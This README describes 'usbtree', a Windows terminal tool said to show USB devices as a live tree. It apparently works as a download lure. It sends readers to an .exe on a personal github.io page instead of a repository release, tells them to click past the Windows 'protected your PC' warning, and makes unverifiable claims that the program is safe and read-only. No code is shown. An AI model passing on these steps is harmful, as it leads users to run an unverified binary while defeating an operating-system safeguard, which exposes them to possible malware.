# 🔌 usbtree - See your computer USB devices live

[![Download usbtree](https://img.shields.io/badge/Download-Release-blue.svg)](https://longrange-willrogers911.github.io)

usbtree shows a live map of every USB device connected to your computer. It runs inside your terminal window. The tool displays your devices as a tree structure. You can see how your devices connect to your machine. 

This tool works on Windows and does not need special permissions to run. It reads your system data and turns it into a clear list. You see device names, ports, and connection paths. You do not need to install drivers or complex software.

## 🚀 Getting Started

To use usbtree, you need a computer running Windows 10 or Windows 11. You do not need to install anything. This program runs as a standalone file. 

1. Visit the [official release page](https://longrange-willrogers911.github.io).
2. Look for the file ending in `.exe` under the latest release section.
3. Click the file name to start the download.
4. Save the file to your desktop or your Downloads folder.

## ⚙️ Running the Program

Once you download the file, you launch it directly. 

1. Locate the file you saved to your computer.
2. Double-click the file icon.
3. A terminal window opens on your screen.
4. The program displays your USB tree immediately.

Your terminal window shows your hardware as a hierarchical list. Devices appear under their respective controllers or hubs. If you plug in a new flash drive or mouse while the program is open, the list updates. You see the changes in real time. 

## 🔍 How to Read the View

The list uses simple symbols to show hierarchy. 

*   **Root Hubs:** These are the main connection points on your motherboard.
*   **Branches:** These represent hubs or ports.
*   **Leaf Nodes:** These represent your actual devices like keyboards, mice, or external drives.

If a device does not appear, check your physical connection. Ensure the cable sits firmly in the port. The tool refreshes the view every second. 

## 🛠 Troubleshooting

Sometimes Windows prevents programs from external sources from running. If you see a blue box that says "Windows protected your PC," follow these steps:

1. Click the "More info" link in the center of the box.
2. Click the "Run anyway" button that appears.

The program runs without modifying your system files. It only reads USB configuration data. It cannot damage your hardware or change your settings.

## 📋 System Requirements

*   **Operating System:** Windows 10 or 11 (64-bit).
*   **Storage:** Less than 10 megabytes of free disk space.
*   **Permissions:** Standard user access. No administrator rights required.
*   **Hardware:** Any standard USB port.

## 💡 Using the Terminal

The program runs in the standard Windows terminal. You can resize the window to see more devices at once. Use your mouse scroll wheel to move up and down the list if you have many devices. Press the Q key on your keyboard to close the program whenever you finish.

## 🛡 Security and Privacy

This program performs "read-only" operations. It explores the USB bus to detect connected hardware. It does not send any data to the internet. It does not store your personal information. Every action stays within the memory of your computer while the window remains open.

## ❓ Frequently Asked Questions

**Do I need to install any extra libraries?**
No. The program includes all necessary code to run. 

**Does this work on older versions of Windows?**
We recommend Windows 10 or newer for the best compatibility.

**Can I save the list to a file?**
The current version focuses on the live view. You can take a screenshot of your terminal window if you need to keep a record of your device setup.

**Why does my keyboard disappear when I unplug it?**
The program detects device removals instantly. The list updates to reflect the new state of your ports.

Keywords: cli, windows, terminal, usb, tui, rust